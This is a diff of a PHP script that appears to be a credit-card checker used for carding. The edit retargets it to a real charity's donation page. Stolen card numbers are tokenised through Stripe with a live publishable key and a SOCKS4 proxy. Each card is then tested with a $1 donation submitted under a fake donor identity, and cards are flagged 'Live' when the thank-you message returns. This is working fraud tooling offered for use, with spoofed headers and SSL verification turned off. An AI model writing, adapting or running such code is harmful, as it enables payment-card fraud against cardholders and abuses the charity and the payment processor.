@@ -47,37 +47,42 @@ $mes = $separa[1];
 $ano = $separa[2];
 $cvv = $separa[3];
 
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=4bbd7843-3f30-472c-aa17-bea2923e58007c680c&sid=497c8554-6c45-4140-87ff-6590857b1cd03febcc&pasted_fields=number&payment_user_agent=stripe.js%2F42e38e0277%3B+stripe-js-v3%2F42e38e0277%3B+card-element&referrer=https%3A%2F%2Fhospicesenb.ca&time_on_page=104300&key=pk_live_51HSROsJidSrnbkCNweqOnOTO7wQwLWX6mRFNAP83H5YChtLFqLZTae4AhfoW7ATeXJ2x96XZQyaMetW9dPS1pEaR00ju9n1ZPO');
+
+$result1 = curl_exec($ch);
+$id = trim(strip_tags(getStr($result1,'"id": "','"')));
+
+# -------------------- [2 REQ] -------------------#
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_URL, 'https://hospicesenb.ca/wp-admin/admin-ajax.php?t=1712216339006');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'POST /v1/payment_methods h2',
-'Host: api.stripe.com',
-'accept: application/json',
-'content-type: application/x-www-form-urlencoded',
-'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-'origin: https://js.stripe.com',
-'sec-fetch-site: same-site',
-'sec-fetch-mode: cors',
-'sec-fetch-dest: empty',
-'referer: https://js.stripe.com/',
-'accept-language: en-US,en;q=0.9',
-));
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'POST /wp-admin/admin-ajax.php?t=1712216339006 h2',
+'Host: hospicesenb.ca',
+'accept: */*',
+'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+'origin: https://hospicesenb.ca',
+'sec-fetch-site: same-origin',
+'sec-fetch-mode: cors',
+'sec-fetch-dest: empty',
+'referer: https://hospicesenb.ca/donate/',
+'accept-language: en-US,en;q=0.9',
+   ));
 
-# ----------------- [1req Postfields] ---------------------#
+# ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=d83c799b-007c-4652-a7ac-12f01373339e7a0d8c&sid=5368db7a-93e0-411b-9c7d-73253282899b3b354d&pasted_fields=number&payment_user_agent=stripe.js%2F1a2719a8b8%3B+stripe-js-v3%2F1a2719a8b8%3B+card-element&referrer=https%3A%2F%2Fmarathonsailfish.com&time_on_page=53682&key=pk_live_51KMduYD6ccCBmaJ3rRrEgIuBzbrLOxeSt3iXNFAXGX1zCpb7O81NJLvyNdyGtRA391teuE99KQxtLN7X7ZwqMsf400mwUHsYqx');
-
-
+curl_setopt($ch, CURLOPT_POSTFIELDS,'data=ak_hp_textarea%3D%26ak_js%3D1712216166069%26__fluent_form_embded_post_id%3D743%26_fluentform_3_fluentformnonce%3D3681263a9a%26_wp_http_referer%3D%252Fdonate%252F%26dropdown_8%3DOne%2520Time%26dropdown%3DIndividual%26dropdown_1%3DGeneral%26custom-payment-amount%3D1%26payment_method_3%3Dstripe%26names%255Bfirst_name%255D%3DGloo%26names%255Blast_name%255D%3DSmoke%26input_text_2%3D0817480671%26email%3Dgloosmoke%2540gmail.com%26address1%255Baddress_line_1%255D%3DStreet%252027%26address1%255Baddress_line_2%255D%3DNew%2520York%26address1%255Bcity%255D%3DNY%26address1%255Bzip%255D%3D10014%26address1%255Bcountry%255D%3DUS%26dropdown_4%3D%26description%3D%26dropdown_5%3D%26description_1%3D%26description_2%3D%26description_3%3D%26description_4%3D%26ak_bib%3D1712216175209%26ak_bfs%3D1712216247002%26ak_bkpc%3D18%26ak_bkp%3D3%253B2%253B3%253B1%253B1%253B7%253B4%252C165%253B7%252C213%253B1%252C71%253B3%252C0%253B4%252C627%253B7%252C292%253B6%252C118%253B3%252C85%253B3%253B1%253B2%252C631%253B15%253B%26ak_bmc%3D9%253B10%252C1582%253B18%252C944%253B9%252C1156%253B11%252C924%253B9%252C1167%253B19%252C4325%253B47%252C2088%253B9%252C1215%253B16%252C7859%253B10%252C8632%253B7%252C1927%253B7%252C2039%253B18%252C2685%253B19%252C3506%253B25%252C5385%253B17%252C1770%253B11%252C2271%253B14%252C23294%253B%26ak_bmcc%3D19%26ak_bmk%3D%26ak_bck%3D15%253B15%253B15%253B15%253B15%253B15%253B15%26ak_bmmc%3D6%26ak_btmc%3D0%26ak_bsc%3D23%26ak_bte%3D%26ak_btec%3D0%26ak_bmm%3D14%252C1%253B5%252C175%253B7%252C1%253B86%252C245%253B5%252C55%253B7%252C1%253B%26ak_bib%3D1712216175209%26ak_bfs%3D1712216271012%26ak_bkpc%3D18%26ak_bkp%3D3%253B2%253B3%253B1%253B1%253B7%253B4%252C165%253B7%252C213%253B1%252C71%253B3%252C0%253B4%252C627%253B7%252C292%253B6%252C118%253B3%252C85%253B3%253B1%253B2%252C631%253B15%253B%26ak_bmc%3D9%253B10%252C1582%253B18%252C944%253B9%252C1156%253B11%252C924%253B9%252C1167%253B19%252C4325%253B47%252C2088%253B9%252C1215%253B16%252C7859%253B10%252C8632%253B7%252C1927%253B7%252C2039%253B18%252C2685%253B19%252C3506%253B25%252C5385%253B17%252C1770%253B11%252C2271%253B14%252C23294%253B6%252C12021%253B18%252C1718%253B10%252C10245%253B%26ak_bmcc%3D22%26ak_bmk%3D%26ak_bck%3D15%253B15%253B15%253B15%253B15%253B15%253B15%26ak_bmmc%3D7%26ak_btmc%3D0%26ak_bsc%3D29%26ak_bte%3D%26ak_btec%3D0%26ak_bmm%3D14%252C1%253B5%252C175%253B7%252C1%253B86%252C245%253B5%252C55%253B7%252C1%253B8%252C204%253B%26__entry_intermediate_hash%3D907b45810dec7141db43ddd31dc98909%26ak_bib%3D1712216175209%26ak_bfs%3D1712216337482%26ak_bkpc%3D18%26ak_bkp%3D3%253B2%253B3%253B1%253B1%253B7%253B4%252C165%253B7%252C213%253B1%252C71%253B3%252C0%253B4%252C627%253B7%252C292%253B6%252C118%253B3%252C85%253B3%253B1%253B2%252C631%253B15%253B%26ak_bmc%3D9%253B10%252C1582%253B18%252C944%253B9%252C1156%253B11%252C924%253B9%252C1167%253B19%252C4325%253B47%252C2088%253B9%252C1215%253B16%252C7859%253B10%252C8632%253B7%252C1927%253B7%252C2039%253B18%252C2685%253B19%252C3506%253B25%252C5385%253B17%252C1770%253B11%252C2271%253B14%252C23294%253B6%252C12021%253B18%252C1718%253B10%252C10245%253B8%252C65029%253B3%252C1429%253B%26ak_bmcc%3D24%26ak_bmk%3D%26ak_bck%3D15%253B15%253B15%253B15%253B15%253B15%253B15%26ak_bmmc%3D7%26ak_btmc%3D0%26ak_bsc%3D32%26ak_bte%3D%26ak_btec%3D0%26ak_bmm%3D14%252C1%253B5%252C175%253B7%252C1%253B86%252C245%253B5%252C55%253B7%252C1%253B8%252C204%253B%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=3');
 
 $result2a = curl_exec($ch);
 
@@ -149,7 +154,7 @@ $response = "Expired Card 🚫";
   }
 
 
-elseif (strpos($result2a, 'redirectUrl')){
+elseif (strpos($result2a, 'Thank you for your donation. We will get in touch with you shortly')){
   $status = "Live 🟢";
 $response = "Charged 1$";
 
